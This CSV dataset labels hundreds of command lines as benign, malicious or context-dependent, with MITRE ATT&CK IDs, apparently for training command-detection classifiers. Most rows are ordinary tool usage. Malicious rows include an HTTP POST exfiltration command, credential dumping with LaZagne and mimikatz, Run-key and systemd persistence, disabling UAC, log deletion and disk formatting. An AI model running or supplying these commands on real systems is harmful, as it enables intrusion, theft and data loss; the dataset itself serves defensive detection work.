command,label,original_label,mitre_id
meld path/to/directory_1 path/to/directory_2,Benign,Benign,Benign
ditto path/to/source_directory path/to/destination_directory,Benign,Benign,Benign
shred -u $FILE,Benign,Benign,Benign
"ls -l --color=always ""$@"" | egrep --color=never '^d|^[[:digit:]]+ d'",Benign,Benign,Benign
gomi --prune orphans,Benign,Benign,Benign
sudo [-s|--shell],Benign,Benign,Benign
path/to/ShooterGameServer TheIsland -ActiveEvent=Summer,Benign,Benign,Benign
find /usr/tom | egrep '*.pl| *.pm',Benign,Benign,Benign
"find . -name ""*.bash"" |xargs grep ""echo""",Benign,Benign,Benign
"find ""$STORAGEFOLDER"" -name .todo -printf '%h\n' | xargs ls -l",Benign,Benign,Benign
bzip3 [-h|--help],Benign,Benign,Benign
setx variable value,Benign,Benign,Benign
btm [-m|--dot_marker],Benign,Benign,Benign
ldapdomaindump [-u|--user] domain\username [-p|--password] password|ntlm_hash hostname|ip,Benign,Benign,Benign
llvm-as path/to/llvm_code.ll | FileCheck path/to/check_file,Benign,Benign,Benign
systemd-mount path/to/file_or_device,Benign,Benign,Benign
find . -name *conf*,Benign,Benign,Benign
arduino-builder -compile path/to/sketch.ino,Benign,Benign,Benign
monodevelop --perf-log,Benign,Benign,Benign
"socat TCP-LISTEN:8080,fork TCP:10.0.0.1:80",Context_Dependent,Synthetic,Synthetic
dropuser [-i|--interactive],Benign,Benign,Benign
"find /dir \( -name foo -prune \) -o \( -name bar -prune \) -o -name ""*.sh"" -print",Benign,Benign,Benign
sass inputfile.scss|inputfile.sass outputfile.css,Benign,Benign,Benign
command -v gawk,Context_Dependent,Synthetic,Synthetic
echo $TERM,Context_Dependent,Synthetic,Synthetic
udiskie-umount --help,Benign,Benign,Benign
ssh -f user@gateway -p 24222 -L 3307:1.2.3.4:3306 -N,Context_Dependent,Benign,Benign
chmod +x $rc_service_path/$rc_service_file,Malicious,Malicious,T1543
Out-ATHPowerShellCommandLineParameter -CommandLineSwitchType $command_line_switch_type -EncodedCommandParamVariation $encoded_command_param_variation -UseEncodedArguments -EncodedArgumentsParamVariation $encoded_arguments_param_variation -Execute -ErrorAction Stop,Malicious,Malicious,T1059
find ~ -type f -mtime +1825 |xargs -r ls -l,Benign,Benign,Benign
yadm decrypt,Benign,Benign,Benign
exiqgrep -i -f '<email@example.com>' | xargs exim -Mrm,Benign,Benign,Benign
sudo grub-probe [-t|--target] fs_label /boot/grub,Benign,Benign,Benign
hledger print [-f|--file] path/to/foo.journal [-o|--output-file] path/to/output_file.csv,Benign,Benign,Benign
axel [-4|--ipv4] url,Benign,Benign,Benign
grex [-r|--repetitions] string1 string2 ...,Benign,Benign,Benign
nxc vnc 192.168.178.2 [-u|--username] path/to/usernames.txt [-p|--password] path/to/passwords.txt,Benign,Benign,Benign
C:\Windows\ServiceProfiles\NetworkService\appdata\Local\Temp\,Malicious,Malicious,T1074
net start|stop service,Benign,Benign,Benign
nmap -sC -sV -p- 10.10.10.50,Context_Dependent,Synthetic,Synthetic
doctl [d|databases] db [g|get] database_id database_name,Benign,Benign,Benign
swagger-codegen generate [-i|--input-spec] swagger_file [-l|--lang] language,Benign,Benign,Benign
find /home -nouser -print,Context_Dependent,Benign,Benign
netsh,Malicious,Malicious,T1562
guix package [-l|--list-generations],Benign,Benign,Benign
cat path/to/urls.txt | cariddi -debug -sr -ot path/to/debug_output.txt,Benign,Benign,Benign
[System.GC]::Collect(),Malicious,Malicious,T1204
"copy ""PathToAtomicsFolder\..\ExternalPayloads\PsExec.exe"" $env:temp",Malicious,Malicious,T1569
mpicc -o executable path/to/file.c,Benign,Benign,Benign
docker build .,Benign,Benign,Benign
WFMFormat.exe,Malicious,Malicious,T1127
most path/to/file +/string,Benign,Benign,Benign
yadm --yadm-archive,Benign,Benign,Benign
xz path/to/file,Benign,Benign,Benign
"ptargrep [-b|--basename] ""search_pattern"" path/to/file",Benign,Benign,Benign
ipconfig,Benign,Benign,Benign
lxi screenshot [-a|--address] ip_address [-p|--plugin] rigol-1000z,Benign,Benign,Benign
vainfo --display wayland|x11|drm|...,Benign,Benign,Benign
tmuxinator start project,Benign,Benign,Benign
virsh save domain path/to/state_file,Benign,Benign,Benign
pbmtoascii path/to/input_file.pbm,Benign,Benign,Benign
pveum [a|acl] [m|modify] /vms/1000 --user username@pve --role PVEVMUser,Benign,Benign,Benign
find root -mindepth 2 -delete,Benign,Benign,Benign
<Ctrl c><Ctrl c>,Benign,Benign,Benign
ppmtopjxl [-n|-nopack] path/to/image.ppm > path/to/output.pjxl,Benign,Benign,Benign
abbr [-a|--add] abbreviation_name command command_arguments,Benign,Benign,Benign
rpmspec --parse path/to/rpm.spec,Benign,Benign,Benign
uuid -v 4,Benign,Benign,Benign
setfacl [-m|--modify] u:username:rw path/to/file_or_directory,Benign,Benign,Benign
history | grep curl,Context_Dependent,Synthetic,Synthetic
vagrant reload,Benign,Benign,Benign
"net group ""Exchange Servers"" /domain",Context_Dependent,Malicious,T1018
"find /path -type f -name ""10*jpg"" | sed 's/.*/mv &/' | sed 's/mv \(.*\/\)\(.[^/]*\)/& \120\2/' | sh",Benign,Benign,Benign
mkosi qemu,Benign,Benign,Benign
jj git init --git-repo git_repo,Benign,Benign,Benign
pw-cli [i|info] all,Benign,Benign,Benign
dnsx [-d|-domain] FUZZ.example.com [-w|-wordlist] path/to/wordlist.txt [-re|-resp],Benign,Benign,Benign
openssl rand -hex 8,Benign,Benign,Benign
sqlite-utils create-database path/to/database.db,Benign,Benign,Benign
balena app create app_name,Benign,Benign,Benign
cpdf -list-annotations path/to/document.pdf,Benign,Benign,Benign
"find /home/u20806/public_html -maxdepth 1 -mmin +25 -type f -name ""*.txt"" -delete",Context_Dependent,Benign,Benign
replace path\to\file_or_directory path\to\destination_directory /s,Benign,Benign,Benign
crane digest image_name,Benign,Benign,Benign
find . -name modules -exec sh -c 'exit 0' \;,Benign,Benign,Benign
"echo ""setting_value"" | elasticsearch-keystore add --stdin setting_name",Benign,Benign,Benign
find . -type f -print | xargs grep -i 'bin/ksh',Benign,Benign,Benign
sudo find / -name mysql -print,Benign,Benign,Benign
nkf -m --overwrite path/to/file.txt,Benign,Benign,Benign
pridecat path/to/file --lesbian [--bi|--bisexual],Benign,Benign,Benign
kexec [-l|--load] path/to/kernel --initrd=path/to/initrd --command-line=arguments,Benign,Benign,Benign
logoff,Benign,Benign,Benign
"zcat file.gz | awk -v RS=""-----------\n"" '/A=2[ ,\n]/ && /dummy=2[ ,\n]/{count++} !/dummy=2[ ,\n]/{other++} END{print ""Final counter value="",count, ""; other="", other}'",Benign,Benign,Benign
sudo nixos-rebuild build-vm,Benign,Benign,Benign
setsid [-f|--fork] program,Benign,Benign,Benign
tail -50 /var/log/apache2/error.log,Context_Dependent,Synthetic,Synthetic
latex -halt-on-error source.tex,Benign,Benign,Benign
find ./ -name *.ogv -exec echo myfile {} \;,Benign,Benign,Benign
"lebab --transform transformation1,transformation2,...",Benign,Benign,Benign
svg2png path/to/file.svg path/to/output.png,Benign,Benign,Benign
op read secret_reference,Benign,Benign,Benign
git worktree move path/to/worktree new/path,Benign,Benign,Benign
"oxipng ""*.png""",Benign,Benign,Benign
typeinc,Benign,Benign,Benign
lein test,Benign,Benign,Benign
Platypus,Malicious,Malicious,T1480
pm2 list,Benign,Benign,Benign
lilypond [-s|--silent] path/to/file,Benign,Benign,Benign
ooniprobe list,Benign,Benign,Benign
sudo ip [ru|rule] [a|add] to 192.168.178.2/32,Benign,Benign,Benign
while command; do :; done,Benign,Benign,Benign
lvmconfig --typeconfig default --withcomments --withspaces,Benign,Benign,Benign
md-to-clip --no-file-save <(echo 'page-content'),Benign,Benign,Benign
"netsh advfirewall firewall set rule group=""remote desktop"" new enable=Yes",Malicious,Malicious,T1562
rpcdump.py -port port_number domain/username:password@target,Benign,Benign,Benign
youtube-viewer --player=vlc https://youtube.com/watch?v=dQw4w9WgXcQ,Benign,Benign,Benign
sudo cu [-l|--line] /dev/ttyXYZ [-s|--speed] 115200 --parity=even|odd|none [-f|--nortscts] --nostop,Benign,Benign,Benign
"sport search ""keyword""",Benign,Benign,Benign
find . -type f -inum 31467125 -exec mv {} new_name.html \;,Benign,Benign,Benign
alias devn='cat > /dev/null',Benign,Benign,Benign
rm -f *.pdf,Benign,Benign,Benign
text/plain,Malicious,Malicious,T1027
eww [-c|--config] path/to/source_code_directory close window_name,Benign,Benign,Benign
ykinfo -s -q,Benign,Benign,Benign
systemd-tty-ask-password-agent --list,Benign,Benign,Benign
find /path -type f -exec rm '{}' +,Benign,Benign,Benign
readonly existing_variable,Benign,Benign,Benign
swaybg [-i|--image] path/to/image [-m|--mode] stretch|fit|fill|center|tile|solid_color,Benign,Benign,Benign
icalBuddy --formatOutput --separateByCalendar eventsToday,Benign,Benign,Benign
net view /domain,Context_Dependent,Malicious,T1018
freeze path/to/file [-o|--output] path/to/output_image.png,Benign,Benign,Benign
ico -i -lw 10 -threads 5,Benign,Benign,Benign
sslscan example.com,Benign,Benign,Benign
arp-scan 10.0.0.0:255.255.255.0,Context_Dependent,Benign,Benign
"find / -type d -iname ""apt""",Context_Dependent,Benign,Benign
mplayer path/to/file1 path/to/file2 ...,Benign,Benign,Benign
ctags -f path/to/file *,Benign,Benign,Benign
waybar,Benign,Benign,Benign
ykman config usb|nfc [-e|--enable] otp|u2f|fido2|oath|piv|openpgp|hsmauth,Benign,Benign,Benign
roave-backward-compatibility-check,Benign,Benign,Benign
ansible-galaxy collection install|remove collection_name1 collection_name2 ...,Benign,Benign,Benign
"find . -name ""*.xml"" -exec echo {} \;",Benign,Benign,Benign
"find . -name ""*bash*""",Benign,Benign,Benign
find /home -type f -name test.txt -exec rm -f {} \,Context_Dependent,Benign,Benign
logrotate path/to/logrotate.conf --mail /usr/bin/mail_command,Benign,Benign,Benign
"find . -type d -empty -exec rmdir ""{}"" \;",Benign,Benign,Benign
az logicapp delete [-n|--name] name [-g|--resource-group] resource_group,Benign,Benign,Benign
bridge [v|vlan],Benign,Benign,Benign
ansible group [-b|--become] --ask-become-pass [-m|--module-name] command [-a|--args] 'my_command',Benign,Benign,Benign
sudo pacman -Sc,Benign,Benign,Benign
find . type -f -amin -2,Benign,Benign,Benign
find $OUTPUTDIR -type f -mtime +7 -delete,Benign,Benign,Benign
find . -mtime -1 -prin,Benign,Benign,Benign
"& ""PathToAtomicsFolder\..\ExternalPayloads\rubeus.exe"" purge",Malicious,Malicious,T1550
kopia repository create filesystem --path path/to/local_repository,Benign,Benign,Benign
texdoc texdoc,Benign,Benign,Benign
"top -bn1 | grep zombie | awk '{print $4"" ""$6"" ""$8"" ""$10}'",Context_Dependent,Benign,Benign
aider path/to/file1 path/to/file2 ...,Benign,Benign,Benign
molecule create,Benign,Benign,Benign
"bzgrep ""search_pattern"" path/to/file",Benign,Benign,Benign
mkdir aaa/bbb,Benign,Benign,Benign
multipass info instance_name,Benign,Benign,Benign
weasyprint path/to/input.html path/to/output.png --base-url url_or_filename,Benign,Benign,Benign
ssh -R 8080:localhost:80 user@10.10.10.10,Context_Dependent,Synthetic,Synthetic
rabbitmq-plugins set plugin,Benign,Benign,Benign
mailsy d,Benign,Benign,Benign
"su -s /bin/bash -c 'bash --rcfile <(echo ""source ~/.bashrc; source myfile"")'",Benign,Benign,Benign
dtrx --flat path/to/file,Benign,Benign,Benign
psgrep process_name,Benign,Benign,Benign
protoc < message.txt --encode=TypeName input_file.proto,Benign,Benign,Benign
ipcrm [-q|--queue-id] ipc_queue_id,Benign,Benign,Benign
sudo pacman-key [-a|--add] path/to/keyfile.gpg,Benign,Benign,Benign
"sudo btrfs [b|balance] start -musage=20,limit=10,devid=devid path/to/btrfs_filesystem",Benign,Benign,Benign
cargo [b|build] --workspace,Benign,Benign,Benign
find . -type f -not -name '*txt' | xargs rm,Benign,Benign,Benign
sh.stdout.pipe(client);,Malicious,Malicious,T1059
bower install package package,Benign,Benign,Benign
ci -u path/to/file,Benign,Benign,Benign
fail2ban-client stop x,Malicious,Malicious,T1059
unlink /var/log/messages,Malicious,Malicious,T1070
terminalizer share path/to/recording.gif,Benign,Benign,Benign
hr,Benign,Benign,Benign
tcpdump -i eth0 dst 10.0.0.100,Context_Dependent,Synthetic,Synthetic
ppmrainbow color1 color2 ... > path/to/output_file.ppm,Benign,Benign,Benign
co -l path/to/file,Benign,Benign,Benign
"find . \( -name ""*.c"" -or -name ""*.cpp"" -or -name ""*.h"" -or -name ""*.m"" -or -name '*.java' \) -print0 | xargs -0 wc",Benign,Benign,Benign
hg clone [-U|--noupdate] remote_repository_source,Benign,Benign,Benign
find /home/www -type f -name '*.cpp' -exec sed -i 's/previousword/newword/g' '{}' \;,Context_Dependent,Benign,Benign
"compress-archive -path ""$exfil_folder"" -destinationpath ""$exfil_folder.zip"" -force",Malicious,Malicious,T1555
chage -l mysql,Context_Dependent,Synthetic,Synthetic
"find $(pwd) -type f -name ""*.ext"" | while read file; do sed -e 's/^M//g' -i ""$file""; done;",Benign,Benign,Benign
mysqlbinlog --start-position=100 --stop-position=200 path/to/binlog,Benign,Benign,Benign
tofu validate,Benign,Benign,Benign
sudo runuser user [-l|--login],Benign,Benign,Benign
sudo apptainer config fakeroot [-d|--disable] username,Benign,Benign,Benign
echo 'Zone Test 2:00 Jordan CE%sT' >>/path/to/temp-file,Malicious,Malicious,T1059
sudo aa-complain [-d|--dir] path/to/profiles,Benign,Benign,Benign
kubectl events [-o|--output] yaml,Benign,Benign,Benign
$Create.Save(),Malicious,Malicious,T1547
find / -nouser,Context_Dependent,Benign,Benign
nc < filename -l -p port,Context_Dependent,Benign,Benign
"Copy-Item -Path ""$([System.Runtime.InteropServices.RuntimeEnvironment]::GetRuntimeDirectory())InstallUtil.exe"" -Destination ""$Env:windir\System32\Tasks\notepad.exe""",Malicious,Malicious,T1218
"curl -s -A ""*<|>*"" -m3 $domain",Malicious,Malicious,T1071
Add-AppxPackage -Path path\to\package.msix,Benign,Benign,Benign
"https://"" & domain & ""/agent/scripts/"" & moduleName & "".applescript",Malicious,Malicious,T1105
find /path/to/directory -type f -mtime 61 -exec rm -f {} \;,Benign,Benign,Benign
gpg [-k|--list-keys],Benign,Benign,Benign
st-info --sram,Benign,Benign,Benign
find test -path 'test/icecream/cupcake/*' -o -path 'test/mtndew/livewire/*' | cpio -padluv test-keep,Benign,Benign,Benign
rvm install version1 version2 ...,Benign,Benign,Benign
ego query bug package,Benign,Benign,Benign
xplr path/to/directory,Benign,Benign,Benign
x11vnc -forever -viewonly,Benign,Benign,Benign
notmuch setup,Benign,Benign,Benign
kscreen-console [-h|--help],Benign,Benign,Benign
find . -name \*.jpg -exec basename {} \; | uniq -d,Benign,Benign,Benign
git grep ^ | wc -l,Benign,Benign,Benign
pbzip2 [-d|--decompress] path/to/compressed_file.bz2,Benign,Benign,Benign
matchpathcon /path/to/file,Benign,Benign,Benign
dscacheutil -q group,Context_Dependent,Malicious,T1087
"rundll32.exe {PATH},EntryPoint",Malicious,Malicious,T1218
gulp,Benign,Benign,Benign
ecpg -t input.pgc,Benign,Benign,Benign
find / -name linux,Context_Dependent,Benign,Benign
weechat --no-script,Benign,Benign,Benign
"sort [-t|--field-separator] : [-k|--key] 3,3n [-k|--key] 4,4g /etc/passwd",Benign,Benign,Benign
thunderbird -P profile_name,Benign,Benign,Benign
.pth,Malicious,Malicious,T1546
ls `which gcc` -al,Benign,Benign,Benign
"find . -name ""*.txt"" | parallel -j1 --tty vim",Benign,Benign,Benign
zoxide init bash|elvish|fish|nushell|posix|powershell|tcsh|xonsh|zsh,Benign,Benign,Benign
dircolors [-b|--bourne-shell],Benign,Benign,Benign
errno [-l|--list],Benign,Benign,Benign
expand path/to/file,Benign,Benign,Benign
find .. -type d -print0 | xargs -0 tar cf dirstructure.tar --no-recursion,Benign,Benign,Benign
"linode-cli tickets reply ticket_id --description ""The content of your reply""",Benign,Benign,Benign
quilt new filename.patch,Benign,Benign,Benign
"get_iplayer ""https://www.bbc.co.uk/iplayer/episode/program_PID/name-of-show-episode-number-episode-title""",Benign,Benign,Benign
sniffer.py protocol1 protocol2 ...,Benign,Benign,Benign
nslookup -type=MX -debug example.com,Benign,Benign,Benign
pulumi env set environment_name key value,Benign,Benign,Benign
latexpand [-o|--output] path/to/output.tex path/to/file.tex,Benign,Benign,Benign
sudo eclean [-d|--deep] [-n|--package-names] distfiles,Benign,Benign,Benign
clockwork-cli path/to/directory,Benign,Benign,Benign
dbx sync dbfs --source path/to/directory --dest path/to/remote_directory,Benign,Benign,Benign
"find / -user tutonics -name ""file.txt""",Context_Dependent,Benign,Benign
cf push app_name,Benign,Benign,Benign
"find ""${searchpath}"" -type f -print0 | xargs -0 grep -l -E ""${string1}.*${string2}.*${string3}""",Benign,Benign,Benign
"find -type f -exec grep -l ""texthere"" {} +",Benign,Benign,Benign
xterm -bg darkblue -fg yellow,Benign,Benign,Benign
rpm [-q|--query] --changelog package,Benign,Benign,Benign
circup show partial_name,Benign,Benign,Benign
getprop ro.vendor.product.model,Benign,Benign,Benign
propelauth setup [-f|--framework] path/to/directory,Benign,Benign,Benign
grype image:tag,Benign,Benign,Benign
type path\to\file,Context_Dependent,Benign,Benign
nerdctl pull image,Benign,Benign,Benign
CreateRemoteThread,Malicious,Malicious,T1055
setxkbmap fr,Benign,Benign,Benign
cd $(git rev-parse --show-cdup),Benign,Benign,Benign
<RightShift F12>,Benign,Benign,Benign
"tail -f logfile.log | grep --line-buffered ""something"" | read -t 3",Benign,Benign,Benign
xauth info,Benign,Benign,Benign
deluged,Benign,Benign,Benign
clido edit text_editor,Benign,Benign,Benign
"grep ""^core id"" /proc/cpuinfo | sort -u | wc -l",Benign,Benign,Benign
docker system events,Benign,Benign,Benign
mat2 --inplace path/to/file,Benign,Benign,Benign
pio org list,Benign,Benign,Benign
pw-metadata [-d|--delete],Benign,Benign,Benign
tlmgr option setting,Benign,Benign,Benign
tectonic -X init,Benign,Benign,Benign
docker service inspect service_name_or_ID1 service_name_or_ID2,Benign,Benign,Benign
R CMD check path/to/package_source,Benign,Benign,Benign
ludusavi backups --path path/to/backup,Benign,Benign,Benign
pigz -0 [-p|--processes] 4 path/to/file,Benign,Benign,Benign
eget zyedidia/micro [-d|--download-only],Benign,Benign,Benign
skills [ls|list],Benign,Benign,Benign
theHarvester --domain domain_name --source google --file output_file_name,Benign,Benign,Benign
inkmake [-i|--inkscape] /Applications/Inkscape.app/Contents/Resources/bin/inkscape path/to/Inkfile,Benign,Benign,Benign
code tunnel --name xxxxxx,Malicious,Malicious,T1105
circo -T format -O path/to/input.gv,Benign,Benign,Benign
"find . -print0 | xargs -0 -l -i echo ""{}"";",Benign,Benign,Benign
sqlx migrate run [-D|--database-url] database_url,Benign,Benign,Benign
pamslice [-r|-row] n path/to/image.pam,Benign,Benign,Benign
zeroclaw service start,Benign,Benign,Benign
zipcloak path/to/archive.zip,Benign,Benign,Benign
mkfs.ext4 /dev/sda1,Malicious,Synthetic,Synthetic
readpe --exports path/to/executable,Benign,Benign,Benign
GetModuleFileName,Malicious,Malicious,T1106
spicetify apply,Benign,Benign,Benign
pod init,Benign,Benign,Benign
sftp -P remote_port remote_user@remote_host,Benign,Benign,Benign
acpi [-V|--everything],Benign,Benign,Benign
"osascript -e 'say ""Hello""' -e 'say ""world""'",Benign,Benign,Benign
gzip */*.txt,Benign,Benign,Benign
"xonsh -c ""command""",Benign,Benign,Benign
mpg321 [-Z|--random] path/to/file1|URL1 path/to/file2|URL2 ...,Benign,Benign,Benign
<Super v>,Benign,Benign,Benign
timedatectl set-timezone timezone,Benign,Benign,Benign
cl /WX path\to\source.c,Benign,Benign,Benign
find /home -mtime -7,Context_Dependent,Benign,Benign
"tts --text ""text"" --model_path path/to/model.pth --config_path path/to/config.json --out_path path/to/file.wav",Benign,Benign,Benign
zpaq [a|add] -kpassword path/to/archive.zpaq path/to/file_or_directory,Benign,Benign,Benign
type zip,Context_Dependent,Synthetic,Synthetic
systemd-run --user command argument1 argument2 ...,Benign,Benign,Benign
sudo date 093023592021.59,Benign,Benign,Benign
"find . -name ""filename including space"" -print0 | xargs -0 ls -aldF > log.txt",Benign,Benign,Benign
join -a 2 /dev/null /path/to/input-file,Context_Dependent,Malicious,T1005
elasticsearch-keystore create,Benign,Benign,Benign
ubuntu-security-status --thirdparty,Benign,Benign,Benign
getcap -r / 2>/dev/null,Context_Dependent,Synthetic,Synthetic
php artisan serve,Benign,Benign,Benign
bun run --watch path/to/file.ts,Benign,Benign,Benign
dd if=/dev/drive_device of=path/to/file.img status=progress,Benign,Benign,Benign
pgmramp -ellipse path/to/image.pgm > path/to/output.pgm,Benign,Benign,Benign
find main-directory -type f -exec mv -v '{}' '{}'.html \;,Benign,Benign,Benign
GetKeyboardLayout,Context_Dependent,Malicious,T1614
"virt-install [-n|--name] vm_name --cpu host-model,topology.sockets=1,topology.cores=4,topology.threads=2 --memory 16384 --disk path=path/to/image.qcow2,size=250 [-c|--cdrom] path/to/debian.iso",Benign,Benign,Benign
"csslint --errors=errors,universal-selector,imports file.css",Benign,Benign,Benign
adb reverse --remove tcp:remote_port,Benign,Benign,Benign
"{{echo '{""key1"":""value1"", ""key2"":""value2""}'}} | mlr --ijson --ojson --jvstack cat",Benign,Benign,Benign
HKEY_CURRENT_USER\Software\Microsoft\CurrentVersion\Run\,Malicious,Malicious,T1547
git-sizer,Benign,Benign,Benign
lvmpersist start --ourkey 0x1234abcd --vg vg_name,Benign,Benign,Benign
mkvpropedit path/to/file.mkv [-e|--edit] track:s3 [-s|--set] flag-hearing-impaired=1,Benign,Benign,Benign
sha1sum [-c|--check] --quiet path/to/file.sha1,Benign,Benign,Benign
sudo pkill -SIGTERM $process_pattern,Malicious,Malicious,T1489
hx --tutor,Benign,Benign,Benign
msgattrib [-F|--sort-by-file] input.po > sorted.po,Benign,Benign,Benign
rsync -azvu -e ssh user@host1:/directory/ user@host2:/directory2/,Benign,Benign,Benign
rustc --target target_triple path/to/main.rs,Benign,Benign,Benign
kpartx -av whole_disk.img,Benign,Benign,Benign
verilator --cc --exe --build --build-jobs 0 -Wall path/to/source.cpp path/to/output.v,Benign,Benign,Benign
"rundll32.exe ieframe.dll,OpenURL {PATH_ABSOLUTE:.url}",Malicious,Malicious,T1218
diffoscope --exclude-directory-metadata auto|yes|no|recursive path/to/directory1 path/to/directory2,Benign,Benign,Benign
"rpmbuild -bb path/to/spec_file --define ""variable1 value1"" --define ""variable2 value2""",Benign,Benign,Benign
nu path/to/script.nu,Benign,Benign,Benign
sesearch --allow [-s|--source] source_type,Benign,Benign,Benign
sudo aa-complain path/to/profile1 path/to/profile2 ...,Benign,Benign,Benign
"$ADSearch.Filter=""(l=$keyObjectGuid)""",Malicious,Malicious,T1552
regedit -?,Benign,Benign,Benign
cewl --proxy_host host --proxy_port port url,Benign,Benign,Benign
apptainer delete [-F|--force] library://user/collection/container:tag,Benign,Benign,Benign
trawl -l,Benign,Benign,Benign
larasail host domain path/to/site_directory,Benign,Benign,Benign
"find . -name ""*.sql"" -print0 -type f | xargs -0 grep ""expression""",Benign,Benign,Benign
sudo hwclock,Benign,Benign,Benign
"find . -name ""$i"" -type f -print | xargs egrep -n ""$SrchStr"" >/dev/null",Benign,Benign,Benign
mbw -n 0 -t1 -q 2048,Benign,Benign,Benign
clock set 23:59:59 31 april 2000,Benign,Benign,Benign
Invoke-WebRequest -Uri $destination_url -Method POST -Body $filecontent -DisableKeepAlive,Malicious,Malicious,T1041
ctr containers list,Benign,Benign,Benign
swupd bundle-list,Benign,Benign,Benign
sudo btrfs [su|subvolume] [l|list] path/to/mount_point,Benign,Benign,Benign
wscript.exe C:\Windows\System32\gatherNetworkInfo.vbs,Context_Dependent,Malicious,T1082
ect -recurse path/to/directory,Benign,Benign,Benign
Update.exe --download {REMOTEURL},Malicious,Malicious,T1218
tldr [-p|--platform] linux runcon,Benign,Benign,Benign
"echo ""Your secret message"" | rage --encrypt --recipient user --output path/to/message.age",Benign,Benign,Benign
mp4decrypt --key key_id_hex:key_hex path/to/input_file.mp4 path/to/output_file.mp4,Benign,Benign,Benign
HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System Enable LUA=”0”,Malicious,Malicious,T1112
Get-ComputerInfo,Context_Dependent,Malicious,T1082
feedreader --grabArticle=article_url,Benign,Benign,Benign
chgrp -R apache_user files,Benign,Benign,Benign
exiv2 path/to/file,Benign,Benign,Benign
pickle convert path/to/directory,Benign,Benign,Benign
tldr code,Benign,Benign,Benign
blastn -query query.fa -subject subject.fa -outfmt '6 qseqid qlen qstart qend sseqid slen sstart send bitscore evalue pident' -out output.tsv,Benign,Benign,Benign
"find /etc/ -iname ""*"" -type f -print0 | xargs -0 grep -H ""nameserver""",Benign,Benign,Benign
chmod -R $symbolic_mode $file_or_folder,Malicious,Malicious,T1222
kubectl apply set-last-applied [-f|--filename] path/to/file,Benign,Benign,Benign
sg_raw /dev/sr0 EA 00 00 00 00 01,Benign,Benign,Benign
"wc -l `find . -name ""*.php""`",Benign,Benign,Benign
http [-f|--form] POST https://example.com/upload cv@path/to/file,Benign,Benign,Benign
dirbuster -r path/to/report.txt,Benign,Benign,Benign
samtools sort input [-o|--output] output.bam,Benign,Benign,Benign
command | sha384sum,Benign,Benign,Benign
"peludna-prognoza ""city"" --json|xml",Benign,Benign,Benign
C:\ProgramData\Initech\Initech.exe /run,Malicious,Malicious,T1547
LSADUMP::ChangeNTLM,Malicious,Malicious,T1098
"""$lazagne_path"" browsers",Malicious,Malicious,T1555
mp3info -G,Benign,Benign,Benign
"echo ""ExecStartPost=$execstartpost_action"" >> $systemd_service_path/$systemd_service_file",Malicious,Malicious,T1543
dpkg-query [-l|--list] 'libc6*',Benign,Benign,Benign
find /home/david -iname 'index*',Context_Dependent,Benign,Benign
"find /usr/local -iname ""*blast*""",Benign,Benign,Benign
virsh domblklist --domain vm_name,Benign,Benign,Benign
cat input.gv | gv2gxl > output.gxl,Benign,Benign,Benign
java classname,Benign,Benign,Benign
"whiptail --title ""title"" --yesno ""message"" height_in_chars width_in_chars",Benign,Benign,Benign
ngrok http 80,Benign,Benign,Benign
</volume>,Malicious,Malicious,T1222
nmap -O 10.10.10.10,Context_Dependent,Synthetic,Synthetic
find empty1 empty2 not_empty -prune -empty,Benign,Benign,Benign
"df ""$path"" | tail -1 | awk '{ print $6 }'",Benign,Benign,Benign
"yad --file --title ""title_message""",Benign,Benign,Benign
rletopnm [--verb|--verbose] path/to/input.rle > path/to/output.pnm,Benign,Benign,Benign
"find . -type f -name ""*.txt"" ! -path ""./Movies/*"" ! -path ""./Downloads/*"" ! -path ""./Music/*""",Benign,Benign,Benign
lastlog --time 3,Context_Dependent,Benign,Benign
gem uninstall gem_name,Benign,Benign,Benign
"echo ""some_text"" | FileCheck path/to/check_file",Benign,Benign,Benign
bpytop,Benign,Benign,Benign
npm dist-tag rm package_name tag,Benign,Benign,Benign
rawtopgm width height [-m|-maxval] n path/to/image.raw > path/to/output.pgm,Benign,Benign,Benign
virt-manager --show-domain-creator,Benign,Benign,Benign
todo.sh replace item_no 'new_description',Benign,Benign,Benign
git guilt [-w|--ignore-whitespace],Benign,Benign,Benign
pbmpage -a4 > path/to/file.pbm,Benign,Benign,Benign
mu index,Benign,Benign,Benign
k6 run [-o|--out] influxdb=http://localhost:8086/k6db script.js,Benign,Benign,Benign
split --lines=1 --suffix-length=5 input.txt output.,Benign,Benign,Benign
msdtc.exe,Malicious,Malicious,T1036
yarac [-w|--no-warnings] path/to/rule.yar path/to/rule.bin,Benign,Benign,Benign
pyinfra @local path/to/deploy.py,Benign,Benign,Benign
ansible-vault view --vault-password-file path/to/password_file path/to/vault_file,Benign,Benign,Benign
systemctl service-log-level service_name,Benign,Benign,Benign
